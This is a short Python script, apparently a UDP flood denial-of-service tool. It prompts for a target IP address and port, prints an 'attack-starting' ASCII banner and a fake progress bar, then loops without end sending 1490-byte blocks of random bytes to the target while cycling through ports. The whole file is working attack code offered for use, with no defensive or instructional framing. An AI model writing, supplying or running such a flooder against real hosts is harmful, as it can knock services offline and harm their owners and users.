import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("cls")
print("         _   _             _               _             _   _             ")
print("        | | | |           | |             | |           | | (_)            ")
print("    __ _| |_| |_ __ _  ___| | ________ ___| |_ __ _ _ __| |_ _ _ __   __ _ ")
print("   / _` | __| __/ _` |/ __| |/ /______/ __| __/ _` | '__| __| | '_ \ / _` |")
print("  | (_| | |_| || (_| | (__|   <       \__ \ || (_| | |  | |_| | | | | (_| |")
print("   \__,_|\__|\__\__,_|\___|_|\_\      |___/\__\__,_|_|   \__|_|_| |_|\__, |")
print("                                                                      __/ |")
print("                                                                     |___/ ")
print("[                    ] 0% ")
time.sleep(2)
print("[=====               ] 25%")
time.sleep(2)
print("[==========          ] 50%")
time.sleep(2)
print("[===============     ] 75%")
time.sleep(2)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1

